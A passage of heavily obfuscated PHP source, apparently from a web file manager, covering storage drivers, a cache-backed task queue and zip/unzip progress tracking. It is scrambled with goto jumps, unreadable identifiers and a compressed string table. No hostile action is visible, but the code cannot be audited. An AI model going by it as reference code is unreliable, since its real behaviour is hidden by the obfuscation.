"\125\120\x59\x55\x4e\40{$this->username}\72{$Bõ»Ë¡Ä×}", $aš÷ØØù Ğ[175] => $this->endpoint . $BÍ™ØƒÖ‰ì); return $fæÄ£èÒÔÊ; goto FĞëÔ»ÙèÃ; dŒ“ÅÆ°×: $A†•¯–îÈŒ = array($aš÷ØØù Ğ[1332] => $this->bucket, $aš÷ØØù Ğ[1333] => $dŞ´òàóÌ…, $aš÷ØØù Ğ[1334] => time() + $fÕ¨±ŒÈâ…, $aš÷ØØù Ğ[1335] => $eäï‰„˜‡Ì); if ($e‡ÖÆß±ÅÅ) { $A†•¯–îÈŒ[$aš÷ØØù Ğ[1246]] = $e‡ÖÆß±ÅÅ; } $FÈÕãƒ¨¿¦ = base64_encode(json_encode($A†•¯–îÈŒ)); goto eÆŸ™‰ƒ¡º; bÄ“ò§Ì­…: $aš÷ØØù Ğ =& $_SERVER[¢ÌÛ]; $BÍ™ØƒÖ‰ì = $aš÷ØØù Ğ[8] . $this->bucket; $eäï‰„˜‡Ì = gmdate($aš÷ØØù Ğ[1267]); goto dŒ“ÅÆ°×; FĞëÔ»ÙèÃ: } public function download($CĞ‚· íÁ›, $eƒÄöÇˆé) { goto e—îö“éø÷; a®¿Á¸£‡™: $bĞÂîº«›À = 1024 * 200; $eË±Â¿‚Ã = fopen($F“Ó®Äõªª, $_SERVER[¢ÌÛ][1286]); while (!0) { $E’êø äËÎ = $this->fileSubstr($CĞ‚· íÁ›, $fğ¾ ©æ‹â, $bĞÂîº«›À); if ($E’êø äËÎ === !1) { return !1; } fwrite($eË±Â¿‚Ã, $E’êø äËÎ); $fğ¾ ©æ‹â += $bĞÂîº«›À; if (strlen($E’êø äËÎ) < $bĞÂîº«›À) { break; } } goto D‘Âœ² ¶; D‘Âœ² ¶: fclose($eË±Â¿‚Ã); return $eƒÄöÇˆé; goto d”Ü ¬¹²æ; e—îö“éø÷: $F“Ó®Äõªª = IO::getPathInner(IO::mkfile($eƒÄöÇˆé)); if (!($Aóê¸Í÷Ïº = $this->link($CĞ‚· íÁ›))) { return !1; } $fğ¾ ©æ‹â = 0; goto a®¿Á¸£‡™; d”Ü ¬¹²æ: } public function link($dĞ¾‡†á¿½, $e¼©ôÌ°Á = array()) { $Dƒ„š–ìŒ =& $_SERVER[¢ÌÛ]; $dĞ¾‡†á¿½ = trim($dĞ¾‡†á¿½, $Dƒ„š–ìŒ[8]); if (!empty($this->token)) { $E –°á¿¨ˆ = strtotime(date($Dƒ„š–ìŒ[1337])); $f†ùš‘·´Ğ = substr(md5($this->token . $Dƒ„š–ìŒ[280] . $E –°á¿¨ˆ . $Dƒ„š–ìŒ[1338] . $dĞ¾‡†á¿½), 12, 8) . $E –°á¿¨ˆ; $e¼©ôÌ°Á[] = $Dƒ„š–ìŒ[1339] . $f†ùš‘·´Ğ; } $b‹é©œòĞÚ = !empty($e¼©ôÌ°Á) ? $Dƒ„š–ìŒ[69] . implode($Dƒ„š–ìŒ[280], $e¼©ôÌ°Á) : $Dƒ„š–ìŒ[33]; return $this->getHost() . $Dƒ„š–ìŒ[8] . $dĞ¾‡†á¿½ . $b‹é©œòĞÚ; } public function fileOut($D“ ”÷Ç‡Ú, $eÔ³Õè§œ = false, $a¢ñªØé–¬ = false, $Aºµ…ã»‹ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($D“ ”÷Ç‡Ú, $eÔ³Õè§œ, $a¢ñªØé–¬, $Aºµ…ã»‹); } if (!$a¢ñªØé–¬) { $a¢ñªØé–¬ = $this->pathThis($D“ ”÷Ç‡Ú); } $FÃÒÇÜ³ = $eÔ³Õè§œ ? array($_SERVER[¢ÌÛ][1340] . rawurlencode($a¢ñªØé–¬)) : array(); $Aî‹šİŠ¿ = $this->link($D“ ”÷Ç‡Ú, $FÃÒÇÜ³); $this->fileOutLink($Aî‹šİŠ¿); } public function fileOutServer($dÈÖˆóÌ˜, $E˜¢ÜµÏÕÇ = false, $E‹ğ¥šøåÀ = false, $BÀÆÃ±ìœé = '') { parent::fileOut($dÈÖˆóÌ˜, $E˜¢ÜµÏÕÇ, $E‹ğ¥šøåÀ, $BÀÆÃ±ìœé); } public function fileOutImage($D–ê‰Š¿‰, $BÎÖğÈåéÜ = 250) { $dè“¬Ü°× = $this->link($D–ê‰Š¿‰ . $_SERVER[¢ÌÛ][1341] . $BÎÖğÈåéÜ); $this->fileOutLink($dè“¬Ü°×); } public function fileOutImageServer($b®¡ÓÛ¼º, $a÷ƒÙß²¯‹ = 250) { parent::fileOutImage($b®¡ÓÛ¼º, $a÷ƒÙß²¯‹); } public function hashMd5($a°ïí‚°) { $c³ªÆ°©Ü„ =& $_SERVER[¢ÌÛ]; $f™õÕøîÜ¡ = $this->_objectMeta($a°ïí‚°); return isset($f™õÕøîÜ¡[$c³ªÆ°©Ü„[206]]) ? $f™õÕøîÜ¡[$c³ªÆ°©Ü„[206]] : !1; } public function size($C·‘‹ª±¯â) { $aİÓ Óõ = $this->objectMeta($C·‘‹ª±¯â); return $aİÓ Óõ ? $aİÓ Óõ[$_SERVER[¢ÌÛ][77]] : 0; } public function info($fœ…÷ê¼“ñ) { if ($this->isFolder($fœ…÷ê¼“ñ)) { return $this->folderInfo($fœ…÷ê¼“ñ); } else { if ($this->isFile($fœ…÷ê¼“ñ)) { return $this->fileInfo($fœ…÷ê¼“ñ); } } return !1; } public function exist($D¦ªö¾¯Ñ) { return $this->isFile($D¦ªö¾¯Ñ) || $this->isFolder($D¦ªö¾¯Ñ); } public function isFile($e‡ñ¨­Íƒã) { return !$this->isFolder($e‡ñ¨­Íƒã) && $this->objectMeta($e‡ñ¨­Íƒã); } public function isFolder($bß‚ìœ’±Ï) { return $this->cacheMethod($_SERVER[¢ÌÛ][197], $bß‚ìœ’±Ï); } protected function objectMeta($cåÔÕ¥ºµ) { return $this->cacheMethod($_SERVER[¢ÌÛ][198], $cåÔÕ¥ºµ); } protected function _objectMeta($B¬¹œ™˜†…) { goto A¡Œ¨¨×éİ; BÁ×—Ì±¡ª: if (!$EÛèÙ„íõ‡[$cÍƒ«Ì½ã[1062]]) { return null; } $dõÎß¨Ïç¡ = isset($EÛèÙ„íõ‡[$cÍƒ«Ì½ã[1064]]) ? $EÛèÙ„íõ‡[$cÍƒ«Ì½ã[1064]] : array(); if (!isset($dõÎß¨Ïç¡[$cÍƒ«Ì½ã[1343]])) { return null; } goto f±¦çß¶ù; f±¦çß¶ù: $F²ÒŞ¤Áî½ = array($cÍƒ«Ì½ã[29] => isset($dõÎß¨Ïç¡[$cÍƒ«Ì½ã[1343]]) ? $dõÎß¨Ïç¡[$cÍƒ«Ì½ã[1343]] : null, $cÍƒ«Ì½ã[77] => isset($dõÎß¨Ïç¡[$cÍƒ«Ì½ã[1344]]) ? $dõÎß¨Ïç¡[$cÍƒ«Ì½ã[1344]] : null, $cÍƒ«Ì½ã[206] => isset($dõÎß¨Ïç¡[$cÍƒ«Ì½ã[1345]]) ? $dõÎß¨Ïç¡[$cÍƒ«Ì½ã[1345]] : null, $cÍƒ«Ì½ã[1312] => isset($dõÎß¨Ïç¡[$cÍƒ«Ì½ã[1346]]) ? $dõÎß¨Ïç¡[$cÍƒ«Ì½ã[1346]] : null); $F²ÒŞ¤Áî½[$cÍƒ«Ì½ã[1313]] = isset($dõÎß¨Ïç¡[$cÍƒ«Ì½ã[1347]]) ? strtotime($dõÎß¨Ïç¡[$cÍƒ«Ì½ã[1347]]) : $F²ÒŞ¤Áî½[$cÍƒ«Ì½ã[1312]]; return $F²ÒŞ¤Áî½; goto Cí¦öƒº; A¡Œ¨¨×éİ: $cÍƒ«Ì½ã =& $_SERVER[¢ÌÛ]; if ($B¬¹œ™˜†… == $cÍƒ«Ì½ã[33] || $B¬¹œ™˜†… == $cÍƒ«Ì½ã[8]) { return array(); } $EÛèÙ„íõ‡ = $this->ussRequest($B¬¹œ™˜†…, $cÍƒ«Ì½ã[1342]); goto BÁ×—Ì±¡ª; Cí¦öƒº: } protected function _isFolder($a¾çí ¬Õ) { $Aà¾­Ì‹Ø =& $_SERVER[¢ÌÛ]; if ($a¾çí ¬Õ == $Aà¾­Ì‹Ø[33] || $a¾çí ¬Õ == $Aà¾­Ì‹Ø[8]) { return !0; } $eÀ›Öİ’…Ÿ = $this->_objectMeta($a¾çí ¬Õ); return isset($eÀ›Öİ’…Ÿ[$Aà¾­Ì‹Ø[29]]) && $eÀ›Öİ’…Ÿ[$Aà¾­Ì‹Ø[29]] == $Aà¾­Ì‹Ø[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($dµÊµĞ‘›± = false) { } public function exist($AÊé´Ğ’íÅ) { $C°©ßÔè– = $this->info($AÊé´Ğ’íÅ); return $C°©ßÔè–[$_SERVER[¢ÌÛ][193]]; } public function isFile($e÷„¸ÃÍƒ) { $Eğ¬ÄééŒ± = $this->info($e÷„¸ÃÍƒ); return $Eğ¬ÄééŒ±[$_SERVER[¢ÌÛ][193]]; } public function isFolder($CÁ±ñŸ‰Ø³) { return !1; } public function size($aÜğæÓ•‚) { $F¾Á‰‹Ÿù© = $this->info($aÜğæÓ•‚); return $F¾Á‰‹Ÿù©[$_SERVER[¢ÌÛ][77]]; } public function info($bùå‰ê¸İè) { return $this->infoParse($bùå‰ê¸İè); } public function infoAuth($Bœ°ïâæ¾˜) { return $this->infoParse($Bœ°ïâæ¾˜); } public function infoWithChildren($FğÃñÃßÀ) { return $this->infoParse($FğÃñÃßÀ); } public function infoFull($B¡É°Šİ‡) { return $this->infoParse($B¡É°Šİ‡); } private function infoParse($fí•”Ì•®) { $aŸØ‘„¾Ş =& $_SERVER[¢ÌÛ]; $e™˜…äÅ“ = $this->header($fí•”Ì•®); if (!$e™˜…äÅ“ || !$e™˜…äÅ“[$aŸØ‘„¾Ş[712]]) { return !1; } $C´Ší¶Š¸ = _get($e™˜…äÅ“, $aŸØ‘„¾Ş[333], 0); $AÜ¢„Ú¥È² = array($aŸØ‘„¾Ş[28] => $e™˜…äÅ“[$aŸØ‘„¾Ş[28]], $aŸØ‘„¾Ş[75] => $fí•”Ì•®, $aŸØ‘„¾Ş[29] => $aŸØ‘„¾Ş[173], $aŸØ‘„¾Ş[77] => intval($C´Ší¶Š¸), $aŸØ‘„¾Ş[167] => get_path_ext($e™˜…äÅ“[$aŸØ‘„¾Ş[28]]), $aŸØ‘„¾Ş[1227] => $C´Ší¶Š¸ > 0 && $e™˜…äÅ“[$aŸØ‘„¾Ş[1348]], $aŸØ‘„¾Ş[1228] => !1); return $AÜ¢„Ú¥È²; } private function header($EÜ¸ŞÊ·…‹) { goto fˆî¡ß¹•Æ; fˆî¡ß¹•Æ: $Fò÷•ñ§±ó =& $_SERVER[¢ÌÛ]; if (isset(self::$_cacheHeader[$EÜ¸ŞÊ·…‹])) { return self::$_cacheHeader[$EÜ¸ŞÊ·…‹]; } $f¸ò²ŠôÜ = isset($GLOBALS[$Fò÷•ñ§±ó[1349]]) ? $GLOBALS[$Fò÷•ñ§±ó[1349]] : !1; goto FÁ²´“‹ˆê; D”Ü‹Ç¼Ô: return self::$_cacheHeader[$EÜ¸ŞÊ·…‹]; goto AØ»·éğ¿¦; FÁ²´“‹ˆê: $GLOBALS[$Fò÷•ñ§±ó[1349]] = !0; self::$_cacheHeader[$EÜ¸ŞÊ·…‹] = url_header($EÜ¸ŞÊ·…‹); $GLOBALS[$Fò÷•ñ§±ó[1349]] = $f¸ò²ŠôÜ; goto D”Ü‹Ç¼Ô; AØ»·éğ¿¦: } public function hashSimple($b¤®„Ï««, $CŒÌÎ‹è¤ = false) { goto C…È¶¹æ˜«; C¯Óèæ©è‰: $C„½¦Œ­†½ .= $this->fileSubstr($b¤®„Ï««, $Cù²Œñ¡§ß - $bçÀñĞ‹›Œ, $bçÀñĞ‹›Œ); return md5($C„½¦Œ­†½) . $Cù²Œñ¡§ß; goto AÌ¹ßÑàÜ; Có„™öæÚØ: $Cù²Œñ¡§ß = $BÊ™‰´æô”[$F©å„Œ‹Ò—[77]]; $bçÀñĞ‹›Œ = 200; $dù…‰°Æ—ç = 50; goto B÷‹‘ôÃÀÕ; B÷‹‘ôÃÀÕ: if ($Cù²Œñ¡§ß <= $bçÀñĞ‹›Œ * $dù…‰°Æ—ç) { return md5($this->fileSubstr($b¤®„Ï««, 0, $Cù²Œñ¡§ß)) . $Cù²Œñ¡§ß; } $f³íó¶åÕš = intval($Cù²Œñ¡§ß / $dù…‰°Æ—ç); $C„½¦Œ­†½ = $F©å„Œ‹Ò—[33]; goto EÙãÁÍ£à; C…È¶¹æ˜«: $F©å„Œ‹Ò— =& $_SERVER[¢ÌÛ]; $BÊ™‰´æô” = $this->info($b¤®„Ï««); if (!$BÊ™‰´æô” || !$BÊ™‰´æô”[$F©å„Œ‹Ò—[193]]) { return !1; } goto Có„™öæÚØ; EÙãÁÍ£à: $b‰œà×Ñ¤ = timeFloat(); $f±¿ç˜½½„ = 15; for ($Bµñ¾Ÿ—‡é = 0; $Bµñ¾Ÿ—‡é < $dù…‰°Æ—ç; $Bµñ¾Ÿ—‡é++) { if (timeFloat() - $b‰œà×Ñ¤ > $f±¿ç˜½½„) { return !1; } $cŸõÖ¶†ã = $this->fileSubstr($b¤®„Ï««, $f³íó¶åÕš * $Bµñ¾Ÿ—‡é, $bçÀñĞ‹›Œ); if (!$cŸõÖ¶†ã) { return !1; } $C„½¦Œ­†½ .= $cŸõÖ¶†ã; } goto C¯Óèæ©è‰; AÌ¹ßÑàÜ: } public function getContent($D–—â”ÆÜï) { return $this->fileSubstr($D–—â”ÆÜï); } public function fileSubstr($b‹âŒÈÍŒ—, $F•ÊšÈ•‹ = 0, $dÖÅñëŞØ = -1) { goto aé¤ó¡ù¬™; dØŒ¹Òà½ç: $dïÜ·“Ê¯ö = url_request($b‹âŒÈÍŒ—, $AË¬¨‹ĞÏ²[226], !1, $Dç©Àß«…‚, !1, !1, 1); return $dïÜ·“Ê¯ö[$AË¬¨‹ĞÏ²[1064]] ? $dïÜ·“Ê¯ö[$AË¬¨‹ĞÏ²[1064]] : $AË¬¨‹ĞÏ²[33]; goto aÀ©„â´; eùÆœ»‰¡Ê: if ($dÖÅñëŞØ === -1) { $dÖÅñëŞØ = $Aä‹†•¤²É[$AË¬¨‹ĞÏ²[77]]; } if ($dÖÅñëŞØ == 0) { return $AË¬¨‹ĞÏ²[33]; } $Dç©Àß«…‚ = array($AË¬¨‹ĞÏ²[1350] . $F•ÊšÈ•‹ . $AË¬¨‹ĞÏ²[738] . ($F•ÊšÈ•‹ + $dÖÅñëŞØ - 1)); goto dØŒ¹Òà½ç; aé¤ó¡ù¬™: $AË¬¨‹ĞÏ² =& $_SERVER[¢ÌÛ]; $Aä‹†•¤²É = $this->info($b‹âŒÈÍŒ—); if (!$Aä‹†•¤²É || !$Aä‹†•¤²É[$AË¬¨‹ĞÏ²[193]] && $Aä‹†•¤²É[$AË¬¨‹ĞÏ²[77]] > 1024 * 1024 * 10) { return !1; } goto eùÆœ»‰¡Ê; aÀ©„â´: } public function download($aÁô˜‹¯ôï, $D³‚ä«ÙÒ) { Downloader::start($aÁô˜‹¯ôï, $D³‚ä«ÙÒ); return $D³‚ä«ÙÒ; } } goto Dï¥õí®Š³; EùÚ•ó„‘¬: define($_SERVER[¢ÌÛ][0], $_SERVER[¢ÌÛ][1]); $_SERVER[ßŞº€åŒÀğ‘¯] = explode($_SERVER[¢ÌÛ][2], gzinflate(substr($_SERVER[¢ÌÛ][3], 10, -8))); function binCheckEq($bÕó‡º‚¾ª, $Eîìì÷‹•›) { return $bÕó‡º‚¾ª == $Eîìì÷‹•›; } goto FñÃØ‹ñù÷; cîËÂœâŸö: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\x73\x6b\x51\165\x65\x75\145\114\x65\156\x67\164\150"; const QUEUE_DATA = "\x74\141\x73\153\121\165\145\165\x65\x44\x61\x74\141"; public static function initTask() { } public static function add($AÂÔåòÖ†ù, $FÒ¹µÈë×› = array(), $eÊ‰ªØÉÕº = '', $AÄ·¬Õãª = '') { goto f¥²Åš£†; f¥²Åš£†: $Bª°ñ™¦¹¤ =& $_SERVER[¢ÌÛ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Dƒ½¾‚ˆÛë = self::getAll(); goto a«âÂÄŠá®; EõÇ®…£”: self::setAll($Dƒ½¾‚ˆÛë); return !0; goto eá»·—‹; a«âÂÄŠá®: if ($AÄ·¬Õãª && array_find_by_field($Dƒ½¾‚ˆÛë, $Bª°ñ™¦¹¤[92], $AÄ·¬Õãª)) { return !0; } $Dƒ½¾‚ˆÛë[] = array($Bª°ñ™¦¹¤[260] => $AÂÔåòÖ†ù, $Bª°ñ™¦¹¤[1569] => $FÒ¹µÈë×›, $Bª°ñ™¦¹¤[431] => $eÊ‰ªØÉÕº, $Bª°ñ™¦¹¤[92] => $AÄ·¬Õãª); write_log($Bª°ñ™¦¹¤[1570] . $eÊ‰ªØÉÕº, $Bª°ñ™¦¹¤[1571]); goto EõÇ®…£”; eá»·—‹: } public static function run() { goto DƒäĞºÔ½ ; DƒäĞºÔ½ : $b½§¼â‚†Ğ =& $_SERVER[¢ÌÛ]; $fÒ¸ñÃ§Ó„ = self::getAll(); $cœÔ§À  = array_shift($fÒ¸ñÃ§Ó„); goto ağ™ç‘’”; d¢¯ÕõÍÔ–: try { $a§Õó¨Ì©© = Hook::apply($cœÔ§À [$b½§¼â‚†Ğ[260]], $cœÔ§À [$b½§¼â‚†Ğ[1569]]); } catch (Exception $e²ÒÕö‚É) { } write_log($b½§¼â‚†Ğ[1573] . $cœÔ§À [$b½§¼â‚†Ğ[431]], $b½§¼â‚†Ğ[1571]); return !0; goto dÉëó°¹ï; ağ™ç‘’”: if (!$cœÔ§À ) { return !1; } self::setAll($fÒ¸ñÃ§Ó„); write_log($b½§¼â‚†Ğ[1572] . $cœÔ§À [$b½§¼â‚†Ğ[431]], $b½§¼â‚†Ğ[1571]); goto d¢¯ÕõÍÔ–; dÉëó°¹ï: } public static function count() { $a‡–á‘ ï = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$a‡–á‘ ï) { return 0; } return intval($a‡–á‘ ï); } public static function getAll() { $fç£÷«öåº = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$fç£÷«öåº) { return array(); } return $fç£÷«öåº; } public static function setAll($aÙğ…§…ÃŠ) { $Eëò×ë = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($aÙğ…§…ÃŠ), $Eëò×ë); Cache::set(self::QUEUE_DATA, $aÙğ…§…ÃŠ, $Eëò×ë); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto dÇ¥¥¯Š; dÇ¥¥¯Š: $b»»ãŞÑù =& $_SERVER[¢ÌÛ]; parent::startAfter(); Hook::bind($b»»ãŞÑù[1574], array($this, $b»»ãŞÑù[1575])); goto eù„ÚŞéå±; Eôâí‡Ş: if (!$eÆ¯Ö˜“ØÓ[$b»»ãŞÑù[1403]]) { $eÆ¯Ö˜“ØÓ[$b»»ãŞÑù[1403]] = LNG($b»»ãŞÑù[1578]); } goto C‘‡¥åâ™; eù„ÚŞéå±: Hook::bind($b»»ãŞÑù[1065], array($this, $b»»ãŞÑù[1576])); $eÆ¯Ö˜“ØÓ =& $this->task; $eÆ¯Ö˜“ØÓ[$b»»ãŞÑù[1577]] = $b»»ãŞÑù[1070]; goto Eôâí‡Ş; C‘‡¥åâ™: } protected function endAfter() { $f ×Î»òíÕ =& $_SERVER[¢ÌÛ]; parent::endAfter(); Hook::unbind($f ×Î»òíÕ[1574], array($this, $f ×Î»òíÕ[1575])); Hook::unbind($f ×Î»òíÕ[1065], array($this, $f ×Î»òíÕ[1576])); } public function updateAfter() { $Fù‹è¿·Ä” =& $_SERVER[¢ÌÛ]; $B£’†ÏÊÜ© =& $this->task; if (!$B£’†ÏÊÜ©[$Fù‹è¿·Ä”[998]] || !$B£’†ÏÊÜ©[$Fù‹è¿·Ä”[721]]) { return; } if ($B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1577]] == $Fù‹è¿·Ä”[1070]) { $fˆ„Û‹—Â˜ = 0; if ($B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1543]]) { $fˆ„Û‹—Â˜ = $B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1544]] / $B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1543]]; } $B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1499]] = $fˆ„Û‹—Â˜ * 0.3; } else { if ($B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1577]] == $Fù‹è¿·Ä”[309]) { $fˆ„Û‹—Â˜ = $B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1012]] / $B£’†ÏÊÜ©[$Fù‹è¿·Ä”[998]]; $B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1499]] = 0.3 + $fˆ„Û‹—Â˜ * 0.4; } else { if ($B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1577]] == $Fù‹è¿·Ä”[106]) { $e¥‚í‡–ŞÆ = 0; if ($B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1545]] == $Fù‹è¿·Ä”[106]) { $e¥‚í‡–ŞÆ = $B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1544]]; } $fˆ„Û‹—Â˜ = ($B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1548]] + $e¥‚í‡–ŞÆ) / $B£’†ÏÊÜ©[$Fù‹è¿·Ä”[721]]; $B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1499]] = 0.3 + 0.4 + $fˆ„Û‹—Â˜ * 0.3; } } } if ($B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1499]] > 0) { $DÓàéÉŒÚ = timeFloat() - $B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1501]] - $B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1504]]; $B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1505]] = $DÓàéÉŒÚ * (1 - $B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1499]]) / $B£’†ÏÊÜ©[$Fù‹è¿·Ä”[1499]]; } } public function addFile($DªŠº¹¦Ü) { goto F¾…Î†¦ƒ ; F¾…Î†¦ƒ : $aåğ½Œ“±Œ =& $_SERVER[¢ÌÛ]; $eñÔ¹ÚÊØ× =& $this->task; $eÛù÷Èï×± = IO::info($DªŠº¹¦Ü); goto f‚¨Çñ¿Ú; f‚¨Çñ¿Ú: $eñÔ¹ÚÊØ×[$aåğ½Œ“±Œ[1541]] = $eÛù÷Èï×±[$aåğ½Œ“±Œ[28]]; $eñÔ¹ÚÊØ×[$aåğ½Œ“±Œ[1543]] = $eÛù÷Èï×±[$aåğ½Œ“±Œ[77]]; $eñÔ¹ÚÊØ×[$aåğ½Œ“±Œ[1544]] = 0; goto bŞËÅ™ÕÀ; bŞËÅ™ÕÀ: $eñÔ¹ÚÊØ×[$aåğ½Œ“±Œ[1000]] = $aåğ½Œ“±Œ[1560]; $eñÔ¹ÚÊØ×[$aåğ½Œ“±Œ[1545]] = $aåğ½Œ“±Œ[1070]; $eñÔ¹ÚÊØ×[$aåğ½Œ“±Œ[721]] = $eÛù÷Èï×±[$aåğ½Œ“±Œ[77]]; goto f÷Ÿ‚“›×Œ; A¬ƒÃõÊÑ: $this->update(); goto A±ËÉô›¡„; f÷Ÿ‚“›×Œ: $eñÔ¹ÚÊØ×[$aåğ½Œ“±Œ[998]] = 1; $d„‚éË¨å = 0; $eñÔ¹ÚÊØ×[$aåğ½Œ“±Œ[1552]] = array($aåğ½Œ“±Œ[1553] => $d„‚éË¨å + 1, $aåğ½Œ“±Œ[413] => $eÛù÷Èï×±[$aåğ½Œ“±Œ[28]], $aåğ½Œ“±Œ[75] => $eÛù÷Èï×±[$aåğ½Œ“±Œ[75]], $aåğ½Œ“±Œ[493] => $eÛù÷Èï×±[$aåğ½Œ“±Œ[493]] ? $eÛù÷Èï×±[$aåğ½Œ“±Œ[493]] : $eÛù÷Èï×±[$aåğ½Œ“±Œ[75]]); goto A¬ƒÃõÊÑ; A±ËÉô›¡„: } public function unzipAfter($a²œç†‚¾„) { goto CÇˆÛ²Ô¿â; Ašæù¢ñ: $this->update(); self::log($BŞ²ëƒ„è×[1579] . json_encode(array($e‰àèç¼, $FĞÌŞŒ¹ß£))); goto eš­µƒ¾Ì¬; CÇˆÛ²Ô¿â: $BŞ²ëƒ„è× =& $_SERVER[¢ÌÛ]; $e‰àèç¼ =& $this->task; $e‰àèç¼[$BŞ²ëƒ„è×[1577]] = $BŞ²ëƒ„è×[106]; goto EàŸ„Ì˜¨; EàŸ„Ì˜¨: $FĞÌŞŒ¹ß£ = IO::infoWithChildren($a²œç†‚¾„); $dáë±ì×‚« = 0; $e‰àèç¼[$BŞ²ëƒ„è×[1552]] = array($BŞ²ëƒ„è×[1553] => $dáë±ì×‚« + 1, $BŞ²ëƒ„è×[413] => $FĞÌŞŒ¹ß£[$BŞ²ëƒ„è×[28]], $BŞ²ëƒ„è×[75] => $FĞÌŞŒ¹ß£[$BŞ²ëƒ„è×[75]], $BŞ²ëƒ„è×[493] => $FĞÌŞŒ¹ß£[$BŞ²ëƒ„è×[493]] ? $FĞÌŞŒ¹ß£[$BŞ²ëƒ„è×[493]] : $FĞÌŞŒ¹ß£[$BŞ²ëƒ„è×[75]]); goto c‡½–ò‰âì; A—„²ØÙ¼: $e‰àèç¼[$BŞ²ëƒ„è×[1541]] = $BŞ²ëƒ„è×[33]; $e‰àèç¼[$BŞ²ëƒ„è×[1548]] = 0; $e‰àèç¼[$BŞ²ëƒ„è×[721]] = $FĞÌŞŒ¹ß£[$BŞ²ëƒ„è×[77]]; goto Ašæù¢ñ; b‰ğÌÃŞù: $e‰àèç¼[$BŞ²ëƒ„è×[1012]] = 0; $e‰àèç¼[$BŞ²ëƒ„è×[1543]] = 0; $e‰àèç¼[$BŞ²ëƒ„è×[1544]] = 0; goto A—„²ØÙ¼; c‡½–ò‰âì: if ($FĞÌŞŒ¹ß£[$BŞ²ëƒ„è×[29]] == $BŞ²ëƒ„è×[173]) { $e‰àèç¼[$BŞ²ëƒ„è×[998]] = 1; } else { $e‰àèç¼[$BŞ²ëƒ„è×[998]] = $FĞÌŞŒ¹ß£[$BŞ²ëƒ„è×[80]][$BŞ²ëƒ„è×[78]]; } $e‰àèç¼[$BŞ²ëƒ„è×[1000]] = $BŞ²ëƒ„è×[33]; $e‰àèç¼[$BŞ²ëƒ„è×[1545]] = 0; goto b‰ğÌÃŞù; eš­µƒ¾Ì¬: } public function nameParse($fÑ‹¨é«à) { goto E¬´¥è¸‚º; E¬´¥è¸‚º: $BØò©¦•° =& $_SERVER[¢ÌÛ]; $A Ô–‡×Ä =& $this->task; if ($A Ô–‡×Ä[$BØò©¦•°[1577]] == $BØò©¦•°[1070]) { $A Ô–‡×Ä[$BØò©¦•°[1577]] = $BØò©¦•°[309]; $A Ô–‡×Ä[$BØò©¦•°[1548]] = 0; $A Ô–‡×Ä[$BØò©¦•°[721]] = 0; } goto cª—ÙŒ¯³; fóá¢®§Ä±: $this->update(); goto B•ÌŒø‰Ù; cª—ÙŒ¯³: $bª³èò‰†… = get_path_this($fÑ‹¨é«à); if (strstr($bª³èò‰†…, $BØò©¦•°[94])) { $A Ô–‡×Ä[$BØò©¦•°[1012]] += 1; $A Ô–‡×Ä[$BØò©¦•°[998]] += 1; } $A Ô–‡×Ä[$BØò©¦•°[1541]] = $fÑ‹¨é«à; goto fóá¢®§Ä±; B•ÌŒø‰Ù: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $AÓõÈˆ­— =& $_SERVER[¢ÌÛ]; parent::startAfter(); Hook::bind($AÓõÈˆ­—[1580], array($this, $AÓõÈˆ­—[1575])); $aæÚÕÓù¥ö =& $this->task; $aæÚÕÓù¥ö[$AÓõÈˆ­—[1577]] = $AÓõÈˆ­—[1070]; if (!$aæÚÕÓù¥ö[$AÓõÈˆ­—[1403]]) { $aæÚÕÓù¥ö[$AÓõÈˆ­—[1403]] = LNG($AÓõÈˆ­—[1581]); } } protected function endAfter() { $EŞÓ£Ş–£ã =& $_SERVER[¢ÌÛ]; parent::endAfter(); Hook::unbind($EŞÓ£Ş–£ã[1580], array($this, $EŞÓ£Ş–£ã[1575])); } public function updateAfter() { $c¥ÖéÓ¦©† =& $_SERVER[¢ÌÛ]; $d¬’™¿™ÄË =& $this->task; if (!$d¬’™¿™ÄË[$c¥ÖéÓ¦©†[998]] || !$d¬’™¿™ÄË[$c¥ÖéÓ¦©†[721]]) { return; } if ($d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1577]] == $c¥ÖéÓ¦©†[1070]) { $fê¿öåóíğ = $d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1544]]; if ($d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1545]] != $c¥ÖéÓ¦©†[1070]) { $fê¿öåóíğ = 0; } $BµÍ¥‹‚‡° = ($d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1548]] + $fê¿öåóíğ) / $d¬’™¿™ÄË[$c¥ÖéÓ¦©†[721]]; $d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1499]] = $BµÍ¥‹‚‡° * 0.3; } else { if ($d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1577]] == $c¥ÖéÓ¦©†[309]) { $BµÍ¥‹‚‡° = $d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1012]] / 